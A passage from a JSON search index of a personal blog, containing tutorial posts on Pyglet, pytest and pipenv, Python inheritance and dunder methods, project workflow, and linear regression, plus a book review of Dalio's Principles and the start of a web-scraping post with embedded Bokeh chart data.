document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Machine Learning","url":"https://jackmckew.dev/hands-on-machine-learning-chapter-3.html","loc":"https://jackmckew.dev/hands-on-machine-learning-chapter-3.html"},{"title":"Book Review: Principles by Ray Dalio","text":"I've just finished reading Ray Dalio's book Principles , and wanted to use this space to jot down some of my personal takeaways and thoughts. To give some background, Ray Dalio, founder of Bridgewater Assosciates, one of the largest hedge funds in the world, wrote this book around the unique principles that he discovered through his over forty year career that led to his and Bridgewater's success. Dalio believes that it is these principles, that are the reason behind whatever success he has had. Before I get into the thick of it, I would recommend this book to anyone that is feeling they are lacking some direction in their life. One of the organizational techniques I've picked up lately is Bullet Journaling , and one of the takeaways I got from the book was to start prioritizing my to-dos, in comparison to what I do now which is just dump it all onto the paper. The book is broken into two major sections: Life Principles and Work Principles, followed by descriptions of the tools developed to work alongside the principles to help keep the concept of an idea meritocracy intact. The concept of an idea meritocracy, is where you can have a community/company in which the best idea wins, no matter who/where it came from. This is in comparison to regular company structures where the decisions come from top down, which has its pros/cons as well. Life Principles On page 246, there is a summary of the life principles which are fully detailed in the preceding chapter. While I won't go into detail on Ray's perspective of the points, however I'll give a brief description on my personal takeaway. Please note the points are listed in no particular order. 1.1 - Be a hyperrealist - you need to understand, accept and work with reality to be able to appreciate and move forward with things effectively 1.3 - Radical transparency - while this can be a tough habit to develop, it pays itself off time and time again for both yourself and the people around you 1.4 - Look to nature to learn how reality works - if you haven't noticed in my blog posts, I am extremely curious about the natural way of evolution and look to bring it's methods into my everyday life and projects. I believe that Dalio also appreciates the power of evolution and is integrating it into his work (as he later describes) 2 - 5 Step process to get what you want out of life Have clear goals Identify and don't tolerate the problems that stand in the way of our achieving those goals Accurately diagnose the problems to get at their root causes Design plans that will get you around them Do what's necessary to push these designs through to results 3 - Radical open mind - something that I have blogged about in the past, open mindedness, you can find that post here: https://jackmckew.dev/episode-3-open-mind.html 4.5 - Getting the right people in the right roles in support of your goal is the key to succeeding at whatever you choose to accomplish 5.10 - Believability weight your decision making - I believe when gathering opinions and thoughts on something, you must weight the opinions based upon how 'believable' the source is Work Principles Dalio believes that culture is the most important part of any organization. I also share the same perspective that any company consists of two major components: culture and people. If the culture isn't right, the right people won't stay. 1.1 - Realize you have nothing to fear from knowing the truth - while sometimes harsh, having more information can always be beneficial if looked at from the right perspective 3.1 - Recognize that mistakes are a natural part of the evolutionary process - keeping with the theme of evolution is one of the greatest things in nature, it must be accepted that mistakes are apart of it all and are inevitable 3.2 - Don't worry about looking good, worry about achieving your goals - this is one that I try to embrace more and more each time I do something, admittedly at times I will withhold from sharing with others from how much progress has been made, by not sharing, everyone is losing out from sharing the learning experience as well 3.4 - Remember to reflect when you experience pain - it is always a good idea to look back on an experience that didn't go to plan or badly to make sure you adapt and evolve for next time 5.2 - Find the most believable people possible to disagree with you and try to understand their reasoning - a great way at validating your reasoning behind something is to ask someone else to poke holes through it to see if it still stands I believe that the way that you perceive the points in this book is dependent on the stage of life that you are at personally. However, even reading through them now, while I can't resonate with them at this point in time, I am glad that they have planted the seed for later on, which may be of great assistance. That is why I believe you should read this book.","tags":"Book Reviews","url":"https://jackmckew.dev/book-review-principles.html","loc":"https://jackmckew.dev/book-review-principles.html"},{"title":"Intro to Games in Python with Pyglet","text":"Recently, I've been researching ways that I could run a 2D simulation (and hopefully 3D) with many moving pieces and there was a desire to make it interactive as well. I stumbled through many visualisation frameworks such as: p5 pygame plotly panda3d bokeh many others Eventually, through the motivation of another side project (looking into training neural networks to learn how to play games) and inspired by this video from Code Bullet https://www.youtube.com/watch?v=r428O_CMcpI ; I decided on attempting to use Pyglet to do these simulations. While the aforementioned simulations won't be covered in this post, this post aims to demonstrate how I adapted the in-depth tutorial on the Pyglet website (which goes through how to recreate asteroids in Pyglet) to generate vector based objects which can crash into each other. First off as always, start by setting up a virtual environment with your preferred method ( Anaconda or follow my workflow ), since Pyglet has no external dependencies, all you need to do is install the pyglet package. I won't go through all the code in the example, and how it works, I will only go through what I changed in the case to get where I wanted to go. To begin, and make things a bit easier, I downloaded the pyglet-master repository from GitHub ( https://github.com/pyglet/pyglet ) so I didn't have to create and copy the file contents one by one. After going through the different versions with the examples > game folder, I decided all I required was the simple functionality of collision and any further into developing the game wasn't needed for this stage, so I copied out the version 3 folder. If we run 'asteroid.py' from within the version 3 folder, we are met with this screen Now since all I am trying to do is generate multiple objects (which will be shown with the player symbol to indicate direction), I can comment out the lines which give the lives, score, title and interactive player. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Set up the two top labels # score_label = pyglet.text.Label(text=\"Score: 0\", x=10, y=575, batch=main_batch) # level_label = pyglet.text.Label(text=\"Version 3: Basic Collision\", # x=400, y=575, anchor_x='center', batch=main_batch) # Initialize the player sprite # player_ship = player.Player(x=400, y=300, batch=main_batch) # Make three sprites to represent remaining lives # player_lives = load.player_lives(2, main_batch) # Make three asteroids so we have something to shoot at # asteroids = load.asteroids(3, player_ship.position, main_batch) asteroids = load . asteroids ( 100 ,( window_width // 2 , window_height // 2 ), main_batch ) # Store all objects that update each frame in a list # game_objects = [player_ship] + asteroids game_objects = asteroids # Tell the main window that the player object responds to events # game_window.push_handlers(player_ship.key_handler) Now that we've done that, we need to modify the asteroids generator function to use the player sprite. In load.py, you can change simply the img argument to the player image sprite reference like so: 1 new_asteroid = physicalobject . PhysicalObject ( img = resources . player_image , x = asteroid_x , y = asteroid_y , batch = batch ) Now if we run this, the animation will look a little off, because the objects won't be traveling the direction in the direction that the sprite is pointing. This is due to the existing velocity calculation being a random number for both the X and Y component. To make the player sprites move in the direction they are rotated in, and maintain the existing codebase, we will need to convert from polar notation to cartesian . To do this, we add an extra 2 functions into 'util.py' which will do this for us: 1 2 3 4 5 6 7 8 9 def cart2pol ( x , y ): rho = math . sqrt ( x ** 2 + y ** 2 ) phi = math . arctan2 ( y , x ) return ( rho , phi ) def pol2cart ( rho , phi ): x = rho * math . sin ( math . radians ( phi )) y = rho * math . cos ( math . radians ( phi )) return ( x , y ) Note the use of radians in pol2cart, this is due to the affect of quadrants and trigonometric functions . I won't go into detail, but it won't behave like you expect it to. Now to get our player sprites moving in the direction they are rotated, update the code which generates the 'asteroids' to utilise our new function: 1 2 3 new_asteroid . rotation = random . randint ( 0 , 360 ) new_asteroid . velocity_speed = random . random () * 40 new_asteroid . velocity_x , new_asteroid . velocity_y = util . pol2cart ( new_asteroid . velocity_speed , new_asteroid . rotation ) Now when we go and run our main file again, we will met with a screen like this: Where the player sprites will float around in the direction they are pointing, until they crash into another sprite, causing both of them to disappear. This is a quick intro to Pyglet, I am hoping to expand on this simulation and am positive I will be doing further write ups with it in the future.","tags":"Python","url":"https://jackmckew.dev/intro-to-games-in-python-with-pyglet.html","loc":"https://jackmckew.dev/intro-to-games-in-python-with-pyglet.html"},{"title":"Introduction to Pytest & Pipenv","text":"Unit tests in general are good practice within software development, they are typically automated tests written to ensure that a function or section of a program (a.k.a the 'unit') meets its design and behaves as intended. This post won't go into testing structures for complex applications, but rather just a simple introduction on how to write, run and check the output of a test in Python with pytest. As this post is on testing, I also thought it might be quite apt for trialing out a difference package for dependency management. In the past I've used anaconda, virtualenv and just pip, but this time I wanted to try out pipenv. Similar to my post Python Project Workflow where I used virtualenv, you must install pipenv in your base Python directory, and typically add the Scripts folder to your path for ease later on. Now all we need to do is navigate to the folder and run: 1 pipenv shell This will create a virtual environment somewhere on your computer (unless specified) and create a pipfile in the current folder. The pipfile is a file that essentially describes all the packages used within the project, their version number & so on. This is extremely useful when you pick it back up later on and find where you were at or if you wish to share this with others, they can generate their own virtual environment simply from the pipfile with: 1 pipenv install -- dev Enough about pipenv, let's get onto trying out pytest. For this post I will place both my function and it's tests in the same file, however, from my understanding it's best practice to separate them, specifically keeping all tests within an aptly named 'tests' directory for your project/package. First off let's define the function we intend to test later: 1 2 def subtract ( number_1 , number_2 ): return number_1 - number_2 Now we want to test if our function returns 1 if we give it number_1 = 2 and number_2 = 1: 1 2 3 4 import pytest def test_subtract (): assert subtract ( 2 , 1 ) == 1 To run this test, open the pipenv shell like above in the directory of the file where you've written your tests and run: 1 pytest file_name . py This will output the following: Each green dot represents a single test, and we can see that our 1 test passes in 0.02 seconds. To get more information from pytest, use the same command with -v (verbose) option: 1 pytest file_name . py - v Now we might want to check that it works for multiple cases, to do this we can use the parametrize functionality of pytest like so: 1 2 3 4 5 6 7 8 9 10 11 12 13 import pytest def subtract ( number_1 , number_2 ): return number_1 - number_2 @pytest . mark . parametrize ( 'number_1, number_2, expected' , [ ( 2 , 1 , 1 ), ( 5 , 1 , 4 ), ( 6 , 2 , 4 ), ( - 2 , 1 , - 3 ), ]) def test_subtract ( number_1 , number_2 , expected ): assert expected == subtract ( number_1 , number_2 ) Once run with the verbose command, we get the output: Hopefully this post is a gentle introduction to what unit testing can be in Python.","tags":"Python","url":"https://jackmckew.dev/introduction-to-pytest-pipenv.html","loc":"https://jackmckew.dev/introduction-to-pytest-pipenv.html"},{"title":"Inheritance in Python","text":"As Python is a high level, general purpose programming language, which supports users to define their own types using classes, which are most often following the concept of object-oriented programming. Object-oriented programming is a type of software design in which users not only define the data type (eg, int) of a data structure, but also the types of functions that can be applied. Object-oriented programming is built up of a lot of concepts, to name a few: Inheritance Abstraction Class Encapsulation so on This post will cover an introduction to the concept of inheritance using Python and the animal kingdom. First off, we are going to start by defining our 'base' class (also known as abstract class) of our Animal with common properties: 1 2 3 4 5 6 7 8 9 10 11 12 class Animal (): def __init__ ( self , name = 'Animal' ): self . name = name def family ( self ): print ( \"Animal Kingdom\" ) def speak ( self ): raise Exception ( \"Not implemented yet (define speak)\" ) def eat ( self ): raise Exception ( \"Not implemented yet (define eat)\" ) Now that we have our base class, we can define a subclass 'Dog' that will be able to speak if we define the function inside, but we can also see that it derives from it's parent class 'Animal' by printing out it's family. 1 2 3 4 5 6 7 8 9 10 11 class Dog ( Animal ): def __init__ ( self , name = 'Animal' ): super () . __init__ ( name = name ) def speak ( self ): print ( \"Woof!\" ) dog = Dog ( \"Jay\" ) dog . speak () dog . family () Which will print out: 1 2 Woof ! Animal Kingdom See my post on dunders (double underscores) to get a better understanding of how the __init__ function is working: https://jackmckew.dev/dunders-in-python.html Now we can define any subclass which can derive from our parent class 'Animal', or even more we can derive a class from 'Dog' and it will have all it's properties: 1 2 3 4 5 6 7 class JackRussell ( Dog ): def __init__ ( self , name = 'Animal' ): super () . __init__ ( name = name ) dog_2 = JackRussell ( 'Jeff' ) dog_2 . speak () dog_2 . family () Which will also print: 1 2 Woof ! Animal Kingdom Now what if we wanted to specify the family that all of our dog classes are, we can do this by overriding their parent class (similar to how we are overriding the speak function): 1 2 3 4 5 6 7 8 9 class Dog ( Animal ): def __init__ ( self , name = 'Animal' ): super () . __init__ ( name = name ) def family ( self ): print ( \"Mammal\" ) def speak ( self ): print ( \"Woof!\" ) Which then when we run both the below code: 1 2 3 4 5 6 7 8 9 10 11 dog = Dog ( \"Jay\" ) dog . speak () dog . family () class JackRussell ( Dog ): def __init__ ( self , name = 'Animal' ): super () . __init__ ( name = name ) dog_2 = JackRussell ( 'Jeff' ) dog_2 . speak () dog_2 . family () We will now get: 1 2 3 4 Woof ! Mammal Woof ! Mammal You should now be comfortable in understanding how inheritance works. Normally, it's best practice to inherit only from a single parent class when creating subclasses. As multiple inheritance makes your programs less complicated and easier to manage. However, for large programs, it is very difficult to avoid multiple inheritance.","tags":"Python","url":"https://jackmckew.dev/inheritance-in-python.html","loc":"https://jackmckew.dev/inheritance-in-python.html"},{"title":"Dunders in Python","text":"A 'dunder' (double underscores) in Python (also known as a magic method) are the functions within classes having two prefix and suffix underscores in the function name. These are normally used for operator overloading (eg, __init__, __add__, __len__, __repr__, etc). For this post we will build a customized class for vectors to understand how the magic methods can be used to make life easier. First of all before we get into the magic methods, let's talk about normal methods. A method in Python is a function that resides in a class. To begin with our Vector class, we initialise our class and give it a function, for example: 1 2 3 4 class Vector (): def say_hello (): print ( \"Hello! I'm a method\" ) Now to call the method, we simply call the function name along with the Vector instance we wish to use: 1 Vector . say_hello () This will print: 1 Hello! I ' m a method Now for our vector class, we want to be able to initialise it with certain constants or variables for both the magnitude and direction of our vector. We use the __init__ magic method for this, as it is invoked without any call, when an instance of a class is created. 1 2 3 class Vector (): def __init__ ( self , * args ): self . values = args Now when we create an instance of our Vector class, we can give it certain values that it will store in a tuple: 1 2 3 vector_1 = Vector ( 1 , 2 , 3 ) print ( vector_1 ) Which will print: 1 < __main__ . Vector object at 0x03E90530 > But to us humans, this doesn't mean much more than we know what the name of the class is of that instance. What we really want to see when we call print on our class is the values inside it. To do this we use the __repr__ magic method: 1 2 3 4 5 6 7 8 9 class Vector (): def __init__ ( self , * args ): self . values = args def __repr__ ( self ): return str ( self . values ) vector_1 = Vector ( 1 , 2 , 3 ) print ( vector_1 ) Which will print: 1 ( 1 , 2 , 3 ) This is exactly what we want! Now what if we wanted to create a Vector, but we weren't sure what values we wanted to give it yet. What would happen if we didn't give it any values? Would it default to (0,0) like we would hope? 1 2 3 empty_vector = Vector () print ( empty_vector ) Which will print: 1 () Not exactly how we need it, so we would need to run a check when the class is being initialized, to ensure that there are values being provided: 1 2 3 4 5 6 7 8 class Vector (): def __init__ ( self , * args ): if len ( args ) == 0 : self . values = ( 0 , 0 ) else : self . values = args def __repr__ ( self ): return str ( self . values ) Which when initialise an empty instance of our Vector now, it will create a (0,0) vector for us! Now what if we wanted to be able to check how many values were inside our vector class? To do this we can use the __len__ magic method>: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Vector (): def __init__ ( self , * args ): if len ( args ) == 0 : self . values = ( 0 , 0 ) else : self . values = args def __repr__ ( self ): return str ( self . values ) def __len__ ( self ): return len ( self . values ) vector_1 = Vector ( 1 , 2 , 3 ) print ( vector_1 ) print ( len ( vector_1 )) Which will print: 1 2 ( 1 , 2 , 3 ) 3 Hopefully this post has given you insight into how dunders/magic methods could be used to super power your classes and make life much easier! You can find more information and examples about dunders in Python at: < https://docs.python.org/3/reference/datamodel.html#special-method-names","tags":"Python","url":"https://jackmckew.dev/dunders-in-python.html","loc":"https://jackmckew.dev/dunders-in-python.html"},{"title":"Python Project Workflow","text":"This post will go through my personal preference on project structure and workflow for creating a new project and an insight how I work on my projects from a development point of view. I will go from the very start as if I did not have Python/Git installed on my machine whatsoever. First of all, we need to get Python! Head over to https://www.python.org/downloads/ to get the version of Python you need (or default to the latest Python 3 stable release). For version control in my projects, I also like to use Git so, head on over to https://git-scm.com/downloads to download Git for your operating system. Now once these are installed (if you put them in the default location), Python will default to be located in: C:\\Users\\Jack\\AppData\\Local\\Programs\\Python\\Python37-32. For the next few steps to ensure we are setting up virtual environments for our projects open command prompt here if you are on windows. This will look something like this: The 'cd' command in windows (and other OS) stands for change directory, follow this with a path and you will be brought to that directory. Next whenever I first install Python I like to update pip to it's latest release, to do this use the command in this window: 1 python -m pip install --upgrade pip With pip upgraded to it's current release, it's time to install some very helpful packages for setting up projects: virtualenv and cookiecutter. To install these navigate to the the Scripts folder within the current directory with cd ('cd Scripts') and run 'pip.exe install virtualenv cookiecutter', pip will then work it's magic and install these packages for you. If you take a peek into the Scripts folder now in your Python directory, it'll look a little like this: Now something that I personally like to do is add this folder to your system environment variables in Windows so it's much easier to run any packages in your root Python installation on your PC. To do this: type in 'system environment' into the search command select environment variables from the bottom right corner edit system (or user) path variable browse and select the Scripts directory in your Python installation If you chose to do this step, you will now be able to create virtual environments and cookiecutter templates without having to specify the directory to the executables. It's now time to create a project from scratch. So navigate to where you like to keep your projects (mostly mine is in Documents\\Github\\) but you can put them anywhere you like. Now run command prompt again (or keep the one you have open) and navigate to the dedicated folder (or folders) using cd. For most of my projects lately being of data science in nature, I like to use the cookiecutter-data-science template which you can find all the information about here: https://drivendata.github.io/cookiecutter-data-science/ . To then create a project it is as simple as running: 1 cookiecutter https://github.com/drivendata/cookiecutter-data-science Provide as much information as you wish into the questions and you will now have a folder created wherever you ran the command with all the relevant sections from the template. Whenever starting a new Python project, my personal preference is to keep the virtual environment within the directory, however this is not always a normal practice. To create a virtual environment for our Python packages, navigate into the project and run (if you added Scripts to your Path): 1 virtualenv env This will then initialise a folder within your current directory to install a copy of Python and all it's relevant tools with a folder ('env'). Before we go any further, this is the point that I like to initialise a git repository. To do this, run git init from your command line from within the project directory. Now to finish off the final steps of the workflow that will affect the day-to-day development, I like to use pre-commit hooks to reformat my with black and on some projects check for PEP conformance with flake8 on every commit to my projects repository. This is purely a personal preference on how you would like to work, others like to use pytest and more to ensure their projects are working as intended, however I am not at that stage just yet. To install these pre-commits into our workflow, firstly initialise the virtual environment from within our project by navigating to env/Scripts/activate.bat. This will activate your project's Python package management system and runtime, following this you can install packages from pip and otherwise. For our pre-commits we install the package 'pre-commit': 1 pip install pre-commit Following this to set up the commit hooks create a '.pre-commit-config.yaml' within your main project directory. This is where we will specify what hooks we would like to run before being able to commit. Below is a sample .pre-commit-config.yaml that I use in my projects: 1 2 3 4 5 6 7 8 9 10 11 12 13 repos: - repo: https://github.com/ambv/black rev: stable hooks: - id: black language_version: python3.7 - repo: https://github.com/pre-commit/pre-commit-hooks rev: v2.3.0 hooks: - id: flake8 - id: check-yaml - id: end-of-file-fixer - id: trailing-whitespace Now to install these, activate your virtual environment like above, navigate to the project directory and run 'pre-commit install'. This will install the pre-commit hooks within your git directory. Before going any further, I highly recommend to run 'pre-commit run --all-files' to both ensure pre-commit is working as expected and check if there is any project specific settings you may have to set. On the default cookiecutter data science template with the settings as per above this will show on the pre-commit run (after you have staged changes in git (use git add -A for all)): We can see a different opinions in code formatting appearing already from flake8's output. The black code formatter in Python's code length is 88 characters , not 79 like PEP8. So we will add a pyproject.toml to the project directory where we can specify settings within the black tool: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [ tool.black ] line-length = 79 include = '\\.pyi?$' exclude = ''' /( \\.git | \\.hg | \\.mypy_cache | \\.tox | \\.venv | \\.docs | _build | buck-out | build | dist )/ ''' For any flake8 specific settings (such as error codes to ignore), we can set a .flake8 file in the project directory as well, which may look like: 1 2 3 4 5 [ flake8 ] ignore = E203, E266, E501, W503, F403, F401 max-line-length = 88 max-complexity = 18 select = B,C,E,F,W,T4,B9 Finally we are able to run a commit to our project!","tags":"Python","url":"https://jackmckew.dev/python-project-workflow.html","loc":"https://jackmckew.dev/python-project-workflow.html"},{"title":"Linear Regression: Under the Hood with the Normal Equation","text":"Let's dive deeper into how linear regression works. Linear regression follows a general formula: $$ \\hat{y} = \\theta_0 + \\theta_1x_1 + \\theta_2x_2 + \\cdots + \\theta_nx_n $$ Where \\(\\hat{y}\\) is the predicted value, \\(n\\) is the number of features, \\(x_i\\) is the \\(i&#94;{th}\\) feature value and \\(\\theta_n\\) is the \\(n&#94;{th}\\) model parameter. This function is then vectorised which speeds up processing on a CPU, however, I won't go into that further. How does the linear regression model get 'trained'? Training a linear regression model means setting the parameters such that the model best fits the training data set. To be able to do this, we need to be able to measure how good (or bad) the model fits the data. Common ways of measuring this are: Root Mean Square Error (RMSE) Mean Absolute Error (MAE) R-Squared Adjusted R-Squared many others From here on, we will refer to these as the cost function, and the objective is to minimise the cost function. The Normal Equation To find the value of \\(\\theta\\) that minimises the cost function, there is a mathematical equation that gives the result directly, named the Normal Equation $$ \\hat{\\theta} = (X&#94;T \\cdot X)&#94;{-1}\\cdot X&#94;T \\cdot y $$ Where \\(\\hat{\\theta}\\) is the value of \\(\\theta\\) that minimises the cost function and \\(y\\) (once vectorised) is the vector of target values containing \\(y&#94;{(1)}\\) to \\(y&#94;{(m)}\\) . For example if this equation was run on data generated from this formula: 1 2 3 4 import numpy as np X = 10 * np . random . rand ( 100 , 1 ) y = 6 + 2 * X + np . random . rand ( 100 , 1 ) Now to compute \\(\\hat{\\theta}\\) with the normal equation, we can use the inv() function from NumPy's Linear algebra module: 1 2 X_b = np . c_ [ np . ones (( 100 , 1 )), X ] theta_best = np . linalg . inv ( X_b . T . dot ( X_b )) . dot ( X_b . T ) . dot ( y ) With the actual function being \\(y = 6 + 2x_0 + noise\\) , and the equation found: 1 2 array ([[ 5.96356419 ], [ 2.00027727 ]]) Since the noise makes it impossible to recover the exact parameters of the original function now we can use \\(\\hat{\\theta}\\) to make predictions: 1 y_predict = X_new_b . dot ( theta_best ) With y_predict being: 1 2 [[ 5.96356419 ] [ 9.96411873 ]] The equivalent code using Scikit-Learn would look like: 1 2 3 4 5 from sklearn.linear_model import LinearRegression lin_reg = LinearRegression () lin_reg . fit ( X , y ) print ( lin_reg . intercept_ , lin_reg . coef_ ) print ( lin_reg . predict ( X_new )) And it finds: 1 2 3 [ 5.96356419 ] [[ 2.00027727 ]] [[ 5.96356419 ] [ 9.96411873 ]] Using the normal equation to train your linear regression model is linear in regards to the number of instances you wish to train on, meaning you will need to be able to fit the data set in memory. There are many other ways of to train a linear regression, some which are better suited for large number of features, these will be covered in later posts. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Data Science","url":"https://jackmckew.dev/linear-regresssion-under-the-hood-with-the-normal-equation.html","loc":"https://jackmckew.dev/linear-regresssion-under-the-hood-with-the-normal-equation.html"},{"title":"Intro to Web Scraping","text":"Following on from last weeks post where we analysed the amount of repeated letters within current New Zealand town names . There was still one part of that analysis that really bugged me, and if you noticed it was from the data set that was used was using the European town names not the original Maori names. This post will be dedicated to introducing web scraping where we will extract the Maori names and run a similar analysis to present an interactive graph. As like previously, let's take a look at the interactive graph before getting into how it was created. In [11]: from bokeh.resources import CDN from bokeh.embed import file_html html = file_html ( p , CDN , \"NZ_City_Letter_Analysis\" ) from IPython.core.display import HTML HTML ( html ) Out[11]: NZ_City_Letter_Analysis Bokeh.set_log_level(\"info\"); {\"6a79ccec-7604-45e6-8eef-74d2887334ba\":{\"roots\":{\"references\":[{\"attributes\":{},\"id\":\"1010\",\"type\":\"CategoricalScale\"},{\"attributes\":{\"data_source\":{\"id\":\"1001\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1037\",\"type\":\"VBar\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1038\",\"type\":\"VBar\"},\"selection_glyph\":null,\"view\":{\"id\":\"1040\",\"type\":\"CDSView\"}},\"id\":\"1039\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"fill_color\":{\"value\":\"#1f77b4\"},\"line_color\":{\"value\":\"#1f77b4\"},\"top\":{\"field\":\"Count\"},\"width\":{\"value\":0.9},\"x\":{\"field\":\"index\"}},\"id\":\"1037\",\"type\":\"VBar\"},{\"attributes\":{\"source\":{\"id\":\"1001\",\"type\":\"ColumnDataSource\"}},\"id\":\"1040\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1012\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1023\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"1045\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"formatter\":{\"id\":\"1043\",\"type\":\"CategoricalTickFormatter\"},\"ticker\":{\"id\":\"1015\",\"type\":\"CategoricalTicker\"}},\"id\":\"1014\",\"type\":\"CategoricalAxis\"},{\"attributes\":{},\"id\":\"1024\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"1015\",\"type\":\"CategoricalTicker\"},{\"attributes\":{\"callback\":null,\"data\":{\"Count\":[10,1,0,1,4,1,6,3,5,0,4,2,3,6,6,3,0,5,2,4,4,1,3,0,1,0],\"Word_Name\":[\"Aratiatia Lakes, Aratiatia Rapids\",\"Kaik\\u016bmera Bay\",\"Ahuroa\",\"Aratiatia Lakes, Aratiatia Rapids\",\"Keteketerau\",\"Kaipara Flats\",\"Mangangarongaro: Mangangarongaro Stream\",\"Whatiwhatihoe\",\"Aratiatia Lakes, Aratiatia Rapids\",\"Ahuroa\",\"Pukek\\u0101k\\u0101riki\",\"M\\u0101k\\u014dhine Valley\",\"Mangangarongaro: Mangangarongaro Stream\",\"Mangangarongaro: Mangangarongaro Stream\",\"Mokoroa: Mokoroa Stream\",\"Pukepiripiri\",\"Ahuroa\",\"Mangangarongaro: Mangangarongaro Stream\",\"Aratiatia Lakes, Aratiatia Rapids\",\"Aratiatia Lakes, Aratiatia Rapids\",\"Motukauri: Motukauri Island\",\"Awah\\u014dhonu River\",\"Waianiwaniwa\",\"Ahuroa\",\"Kaik\\u016bmera Bay\",\"Ahuroa\"],\"index\":[\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"]},\"selected\":{\"id\":\"1049\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1048\",\"type\":\"UnionRenderers\"}},\"id\":\"1001\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"overlay\":{\"id\":\"1047\",\"type\":\"BoxAnnotation\"}},\"id\":\"1025\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"1048\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"grid_line_color\":null,\"ticker\":{\"id\":\"1015\",\"type\":\"CategoricalTicker\"}},\"id\":\"1017\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"1026\",\"type\":\"SaveTool\"},{\"attributes\":{\"callback\":null,\"tooltips\":[[\"Word\",\"@Word_Name\"]]},\"id\":\"1002\",\"type\":\"HoverTool\"},{\"attributes\":{\"formatter\":{\"id\":\"1045\",\"type\":\"BasicTickFormatter\"},\"ticker\":{\"id\":\"1019\",\"type\":\"BasicTicker\"}},\"id\":\"1018\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"1043\",\"type\":\"CategoricalTickFormatter\"},{\"attributes\":{},\"id\":\"1027\",\"type\":\"ResetTool\"},{\"attributes\":{\"text\":\"Letter 